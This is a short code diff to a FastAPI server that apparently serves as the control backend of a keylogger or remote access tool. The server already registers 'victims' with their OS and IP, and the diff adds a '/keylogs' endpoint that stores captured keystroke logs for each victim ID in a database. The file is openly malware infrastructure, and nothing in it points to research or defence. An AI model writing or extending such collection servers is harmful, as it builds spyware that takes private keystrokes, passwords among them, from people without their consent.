@@ -1,6 +1,7 @@
 from fastapi import FastAPI, Response, WebSocket, WebSocketDisconnect, status, websockets
 from models.victim import Victim
 from data.db import db
+from models.keylogs import Keylogs
 from socketManager import manager
 
 server = FastAPI()
@@ -22,6 +23,10 @@ async def connect(victim:Victim, response: Response):
                 "OS":victim.OS,
                 "IP":victim.IP
             }})
+
+@server.post("/keylogs", status_code=status.HTTP_200_OK, response_class=Response)
+async def keylogs(keylogs:Keylogs,response:Response):
+    db.keylogs.insert_one({"UUID":keylogs.UUID, "logs":keylogs.data, "timeStamp":keylogs.timeStamp})
 
 sockets = manager.socketManager()
 
